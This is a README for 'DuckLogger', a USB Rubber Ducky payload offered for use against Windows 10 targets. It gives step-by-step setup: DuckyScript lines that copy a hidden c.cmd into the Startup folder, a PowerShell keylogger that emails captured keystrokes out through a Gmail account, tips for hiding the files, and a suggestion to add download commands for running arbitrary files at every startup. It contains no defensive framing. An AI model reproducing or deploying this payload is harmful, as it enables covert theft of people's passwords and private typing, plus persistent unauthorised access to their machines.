# DuckLogger
> Chris Taylor [Blue Cosmo] | 08/24/21
---

```
:::::::::  :::    :::  ::::::::  :::    ::: :::        ::::::::   ::::::::   ::::::::  :::::::::: :::::::::
:+:    :+: :+:    :+: :+:    :+: :+:   :+:  :+:       :+:    :+: :+:    :+: :+:    :+: :+:        :+:    :+:
+:+    +:+ +:+    +:+ +:+        +:+  +:+   +:+       +:+    +:+ +:+        +:+        +:+        +:+    +:+  
+#+    +:+ +#+    +:+ +#+        +#++:++    +#+       +#+    +:+ :#:        :#:        +#++:++#   +#++:++#:    
+#+    +#+ +#+    +#+ +#+        +#+  +#+   +#+       +#+    +#+ +#+   +#+# +#+   +#+# +#+        +#+    +#+    
#+#    #+# #+#    #+# #+#    #+# #+#   #+#  #+#       #+#    #+# #+#    #+# #+#    #+# #+#        #+#    #+#     
#########   ########   ########  ###    ### ########## ########   ########   ########  ########## ###    ###     
```

## Overview:
```
DuckLogger is a USB RubberDucky payload that uses powershell to log keystrokes
```
- moves *c.cmd* file to windows startup directory
- *c.cmd* will secretly run *l.ps1*
- *l.ps1* will log keystrokes and email the logs every startup [via SMTP]

## Resources:
- [YouTube Video]()
- [YouTube Channel](https://youtube.com/cosmodiumcs)
- [Website](https://cosmodiumcs.com)

## Requirements:
- Twin-Duck flashware
- Gmail account
    - i suggest making a separate Gmail account for this payload
    - your Gmail must have [LSA Access](https://myaccount.google.com/lesssecureapps?pli=1&rapt=AEjHL4Px2VEFPoFPEuLutMD6UhNVRyY9P3s7l-pCGA53NBqilKVrtltrfS1823x5i6k6_pSEVp6jkEW0zKQT2CHN0WXh4fvGiw) enabled
- Windows 10 Target

## Instructions:
Set-Up/Installation
1. change Gmail credentials in *c.cmd*
```powershell
# gmail credentials
$email = "example@gmail.com"
$password = "password"
```
2. change name of the SD Card in *payload.txt*
```
REM change 'L' do the name of your ducky
STRING $u=gwmi Win32_Volume|?{$_.Label -eq'L'}|select name;cd $u.name;cp .\c.cmd "C:/Users/$($env:UserName)/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/";exit
```
3. choose an option in *payload.txt*
```
REM comment out the option you decide NOT to use

REM STAGE 5 [OPTION1]
REM run keylogger
STRING .\c.cmd;exit

REM STAGE 5 [OPTION2]
REM restart computer
STRING shutdown /r
```
4. flash Twin-Duck flashware on to your duck
    - [Tutorial](https://youtu.be/ao32BS8fwaM?t=700)
5. load and deploy!!

## Extraneous:
The *c.cmd* attack opportunity
```
the c.cmd file runs every startup.
this means an attacker could place a
'wget' or 'Invoke-WebRequest' and have a file
be downloaded from anywhere on the internet onto the computer.
the file would then save in the startup directory,
allowing it to run every startup
```
---
Show Files via powershell
```
TEMP:
    attrib -h -s -r l.ps1;attrib -h -s -r "$env:UserName.log"
STARTUP:
    attrib -h -s -r c.cmd
```
---
- hope you enjoy the payload!!
- please subscribe to my [YouTube channel](https://youtube.com/cosmodiumcs) :)
